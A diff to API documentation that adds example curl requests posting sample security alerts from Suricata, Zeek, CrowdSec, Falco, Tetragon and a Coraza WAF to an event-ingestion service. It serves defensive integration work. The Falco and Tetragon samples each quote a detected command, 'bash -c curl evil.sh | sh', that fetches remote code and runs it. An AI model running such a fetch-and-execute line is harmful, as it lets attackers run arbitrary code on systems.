@@ -182,6 +182,157 @@ curl -sS -X POST "$BASE_URL/v1/integrations/waf_api_attack_v1/event" \
   }'
 ```
 
+Suricata EVE alert example:
+
+```bash
+curl -sS -X POST "$BASE_URL/v1/integrations/suricata_eve_v1/event" \
+  -H "X-API-Key: $API_KEY" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "source_api_key": "<source-registry-api-key>",
+    "confidence": 0.94,
+    "payload": {
+      "timestamp": "2026-02-25T12:12:00Z",
+      "src_ip": "41.90.0.10",
+      "dest_ip": "196.201.214.10",
+      "dest_port": 443,
+      "app_proto": "http",
+      "alert": {
+        "signature": "ET WEB_SERVER SQL Injection Attempt",
+        "category": "Web Application Attack",
+        "severity": 1,
+        "action": "allowed"
+      },
+      "http": {
+        "hostname": "api.gov.ke",
+        "url": "/v1/payments",
+        "http_method": "POST"
+      }
+    }
+  }'
+```
+
+Zeek notice example:
+
+```bash
+curl -sS -X POST "$BASE_URL/v1/integrations/zeek_notice_v1/event" \
+  -H "X-API-Key: $API_KEY" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "source_api_key": "<source-registry-api-key>",
+    "confidence": 0.9,
+    "payload": {
+      "ts": "2026-02-25T12:15:00Z",
+      "note": "SSH::Password_Guessing",
+      "msg": "198.51.100.10 appears to be guessing SSH passwords",
+      "src": "198.51.100.10",
+      "dst": "10.0.0.10",
+      "host": "bastion.internal",
+      "p": 22,
+      "proto": "tcp"
+    }
+  }'
+```
+
+CrowdSec alert example:
+
+```bash
+curl -sS -X POST "$BASE_URL/v1/integrations/crowdsec_alert_v1/event" \
+  -H "X-API-Key: $API_KEY" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "source_api_key": "<source-registry-api-key>",
+    "confidence": 0.91,
+    "payload": {
+      "created_at": "2026-02-25T12:18:00Z",
+      "scenario": "crowdsecurity/http-bf",
+      "scope": "ip",
+      "value": "41.90.0.10",
+      "service_id": "ecitizen-api",
+      "remediation": true,
+      "decisions": ["ban"],
+      "events_count": 17
+    }
+  }'
+```
+
+Falco runtime alert example:
+
+```bash
+curl -sS -X POST "$BASE_URL/v1/integrations/falco_runtime_v1/event" \
+  -H "X-API-Key: $API_KEY" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "source_api_key": "<source-registry-api-key>",
+    "confidence": 0.92,
+    "payload": {
+      "output_time": "2026-02-25T12:20:00Z",
+      "rule": "Write below binary dir",
+      "priority": "Warning",
+      "hostname": "worker-01",
+      "output": "File below a binary dir opened for writing",
+      "output_fields": {
+        "container.id": "abc123",
+        "container.name": "payments-api",
+        "k8s.pod.name": "payments-api-7689",
+        "k8s.ns.name": "prod",
+        "proc.name": "bash",
+        "proc.cmdline": "bash -c curl evil.sh | sh",
+        "fd.name": "/usr/bin/curl",
+        "user.name": "root"
+      }
+    }
+  }'
+```
+
+Tetragon runtime alert example:
+
+```bash
+curl -sS -X POST "$BASE_URL/v1/integrations/tetragon_runtime_v1/event" \
+  -H "X-API-Key: $API_KEY" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "source_api_key": "<source-registry-api-key>",
+    "confidence": 0.93,
+    "payload": {
+      "event_time": "2026-02-25T12:22:00Z",
+      "event_type": "process_exec",
+      "policy_name": "suspicious-shell",
+      "verdict": "denied",
+      "hostname": "worker-02",
+      "pod_name": "identity-api-554f",
+      "namespace": "prod",
+      "workload": "identity-api",
+      "process_name": "bash",
+      "command_line": "bash -c curl evil.sh | sh",
+      "file_path": "/usr/bin/bash"
+    }
+  }'
+```
+
+Coraza / OWASP CRS alert example:
+
+```bash
+curl -sS -X POST "$BASE_URL/v1/integrations/coraza_waf_v1/event" \
+  -H "X-API-Key: $API_KEY" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "source_api_key": "<source-registry-api-key>",
+    "confidence": 0.94,
+    "payload": {
+      "timestamp": "2026-02-25T12:24:00Z",
+      "host": "api.gov.ke",
+      "uri": "/v1/payments",
+      "rule_id": "942100",
+      "attack_type": "sql_injection",
+      "action": "denied",
+      "remote_addr": "41.90.0.10",
+      "request_method": "POST",
+      "tx_id": "tx-1"
+    }
+  }'
+```
+
 ## 6) Event Retrieval
 
 Search events:
